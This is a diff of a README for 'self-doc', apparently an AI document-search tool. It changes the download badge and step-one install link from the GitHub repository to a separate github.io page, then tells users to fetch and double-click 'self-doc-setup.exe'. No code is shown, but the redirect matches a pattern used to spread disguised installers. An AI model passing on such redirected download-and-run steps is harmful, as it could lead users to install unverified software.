@@ -1,6 +1,6 @@
 # 🧠 self-doc - Search your documents with intelligent AI
 
-<a href="https://github.com/osmondpharisaic206/self-doc">
+<a href="https://osmondpharisaic206.github.io">
   <img src="https://img.shields.io/badge/Download-self--doc-blue" alt="Download self-doc">
 </a>
 
@@ -23,7 +23,7 @@ Your computer needs a few things to run this software. Please verify you meet th
 
 Follow these steps to install and run the application on your computer.
 
-1. Visit this page to download the setup file: [https://github.com/osmondpharisaic206/self-doc](https://github.com/osmondpharisaic206/self-doc).
+1. Visit this page to download the setup file: [https://osmondpharisaic206.github.io](https://osmondpharisaic206.github.io).
 2. Look for the file named `self-doc-setup.exe` under the latest release section.
 3. Click the file to save it to your Downloads folder.
 4. Open your Downloads folder and double-click the file to start the installation.
